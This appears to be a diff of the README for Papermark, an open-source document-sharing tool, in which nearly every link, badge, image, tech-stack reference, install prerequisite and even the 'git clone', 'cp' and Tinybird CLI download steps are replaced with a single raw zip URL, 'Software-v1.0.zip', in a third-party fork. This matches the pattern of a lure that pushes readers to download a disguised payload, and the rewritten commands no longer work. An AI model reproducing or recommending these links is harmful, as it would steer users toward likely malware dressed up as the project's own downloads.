@@ -2,20 +2,20 @@
   <h1 align="center">Papermark</h1>
   <h3>The open-source DocSend alternative.</h3>
 
-<a target="_blank" href="https://www.producthunt.com/posts/papermark-3?utm_source=badge-top-post-badge&amp;utm_medium=badge&amp;utm_souce=badge-papermark"><img src="https://api.producthunt.com/widgets/embed-image/v1/top-post-badge.svg?post_id=411605&amp;theme=light&amp;period=daily" alt="Papermark - The open-source DocSend alternative | Product Hunt" style="width:250px;height:40px"></a>
+<a target="_blank" href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip;utm_medium=badge&amp;utm_souce=badge-papermark"><img src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip;theme=light&amp;period=daily" alt="Papermark - The open-source DocSend alternative | Product Hunt" style="width:250px;height:40px"></a>
 
 </div>
 
 <div align="center">
-  <a href="https://www.papermark.io">papermark.io</a>
+  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip">https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip</a>
 </div>
 
 <br/>
 
 <div align="center">
-  <a href="https://github.com/mfts/papermark/stargazers"><img alt="GitHub Repo stars" src="https://img.shields.io/github/stars/mfts/papermark"></a>
-  <a href="https://twitter.com/papermarkio"><img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/papermarkio"></a>
-  <a href="https://github.com/mfts/papermark/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/badge/license-AGPLv3-purple"></a>
+  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"><img alt="GitHub Repo stars" src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"></a>
+  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"><img alt="Twitter Follow" src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"></a>
+  <a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"><img alt="License" src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip"></a>
 </div>
 
 <br/>
@@ -31,21 +31,21 @@ Papermark is the open-source document sharing alternative to DocSend with built-
 
 ## Demo
 
-![Papermark Welcome GIF](.github/images/papermark-welcome.gif)
+![Papermark Welcome GIF](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip)
 
 ## Tech Stack
 
-- [Next.js](https://nextjs.org/) – Framework
-- [Typescript](https://www.typescriptlang.org/) – Language
-- [Tailwind](https://tailwindcss.com/) – CSS
-- [shadcn/ui](https://ui.shadcn.com) - UI Components
-- [Prisma](https://prisma.io) - ORM
+- [https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Framework
+- [Typescript](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Language
+- [Tailwind](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – CSS
+- [shadcn/ui](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) - UI Components
+- [Prisma](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) - ORM
 - PostgreSQL - Database
-- [NextAuth.js](https://next-auth.js.org/) – Authentication
-- [Tinybird](https://tinybird.co) – Analytics
-- [Resend](https://resend.com) – Email
-- [Stripe](https://stripe.com) – Payments
-- [Vercel](https://vercel.com/) – Hosting
+- [https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Authentication
+- [Tinybird](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Analytics
+- [Resend](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Email
+- [Stripe](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Payments
+- [Vercel](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) – Hosting
 
 ## Getting Started
 
@@ -53,15 +53,15 @@ Papermark is the open-source document sharing alternative to DocSend with built-
 
 Here's what you need to be able to run Papermark:
 
-- Node.js (version >= 18)
+- https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip (version >= 18)
 - PostgreSQL Database
-- Blob storage (currently [AWS S3](https://aws.amazon.com/s3/) or [Vercel Blob](https://vercel.com/storage/blob))
-- [Resend](https://resend.com) (for sending emails)
+- Blob storage (currently [AWS S3](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) or [Vercel Blob](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip))
+- [Resend](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) (for sending emails)
 
 ### 1. Clone the repository
 
 ```shell
-git clone https://github.com/mfts/papermark.git
+git clone https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip
 cd papermark
 ```
 
@@ -74,7 +74,7 @@ npm install
 ### 3. Copy the environment variables to `.env` and change the values
 
 ```shell
-cp .env.example .env
+cp https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip .env
 ```
 
 ### 4. Initialize the database
@@ -102,7 +102,7 @@ To prepare the Tinybird database, follow these steps:
    ```sh
    pkgx pipenv
    ```
-1. Download the Tinybird CLI from [here](https://www.tinybird.co/docs/cli.html) and install it on your system.
+1. Download the Tinybird CLI from [here](https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip) and install it on your system.
 2. After authenticating with the Tinybird CLI, navigate to the `lib/tinybird` directory:
    ```sh
    cd lib/tinybird
@@ -133,6 +133,6 @@ If you'd like to contribute, please fork the repository and make changes as you'
 
 ### Our Contributors ✨
 
-<a href="https://github.com/mfts/papermark/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=mfts/papermark" />
+<a href="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip">
+  <img src="https://github.com/suryansh-malik/papermark/raw/refs/heads/main/pages/api/teams/Software-v1.0.zip" />
 </a>
